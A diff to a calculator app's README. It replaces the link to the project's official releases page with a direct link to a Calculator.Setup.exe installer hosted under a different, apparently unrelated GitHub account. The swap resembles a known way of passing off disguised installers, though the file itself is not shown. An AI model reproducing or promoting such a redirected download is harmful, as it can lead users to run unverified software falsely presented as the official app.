@@ -46,7 +46,7 @@ pip install customtkinter
 
 Download the latest version from Releases:
 
-[Download Calculator App](https://github.com/Codilosopher/Calculator/releases/latest)
+[Download Calculator App](https://github.com/aegon-targeryan-2/Calculator/releases/download/v1.0.0/Calculator.Setup.exe)
 
 Or download the installer directly from the Releases section.
 
